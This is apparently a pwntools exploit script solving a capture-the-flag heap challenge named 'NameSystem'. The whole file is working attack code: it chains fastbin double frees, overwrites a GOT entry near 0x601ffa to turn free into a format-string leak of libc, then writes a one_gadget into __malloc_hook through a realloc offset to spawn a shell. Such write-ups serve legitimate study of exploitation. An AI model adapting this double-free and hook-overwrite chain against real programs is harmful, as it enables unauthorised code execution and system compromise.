#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './NameSystem'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('choice :\n', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('Size:', str(size))
	p.sendlineafter('Name:', content)

def add_(size, content):
	p.sendlineafter('choice :', '1')
	p.sendlineafter('Size:', str(size))
	p.sendlineafter('Name:', content)


def free(idx):
	menu(3)
	p.sendlineafter('delete:', str(idx))
	print "free %d success" % idx

def exploit():

	[add(0x40, 'a') for i in range(16)]		#padding 0-15

	add(0x50,"%13$p\n")					#16

	[add(0x50, 'b') for i in range(3)]		#frist 17-19

	free(17)											
	free(19)
	free(17)
	free(17)

	add(0x60, 'padding')			#17
	add(0x60, 'padding')			#18
	add(0x60, 'padding')			#at 19

	free(17)						#18 same as 19
	free(19)
	free(17)
	free(17)

	[free(1) for i in range(10)]							#what's wrong with here padding


	#now we have two double chains, 0x60 & 0x70

	#frist try to get got
	add(0x50, p64(0x601ffa))		#
	add(0x50, p64(0x601ffa))
	add(0x50, 'aaa')
	add(0x50, 'a'*0xe + p64(0x4006d0) + p64(0x4006d0))

	#free(6)
	p.sendlineafter('choice :', '3')
	p.sendlineafter('delete:', str(6))
	libc_base = int(p.recvuntil('!')[:-5], 16) - 0x20830
	libc.address = libc_base
	__malloc_hook = libc.symbols['__malloc_hook']
	__libc_realloc = libc.symbols['__libc_realloc']
	gadget = libc_base + 0xf1147
	print "libc_base ==> " + hex(libc_base)

	#second get __malloc_hook
	add_(0x60, p64(__malloc_hook-0x23))		#which is offset = 0xe from &stdout
	add_(0x60, 'padding')
	add_(0x60, 'padding')
	add_(0x60, 'a'*0xb + p64(gadget) + p64(__libc_realloc+0x14))
	gdb.attach(p, 'b* 0x400BCB')
	dbg()
	add_(0x60, 'shell')

	p.interactive()
	p.close()



if __name__ == '__main__':
	p = process('./NameSystem')
	libc = elf.libc
	exploit()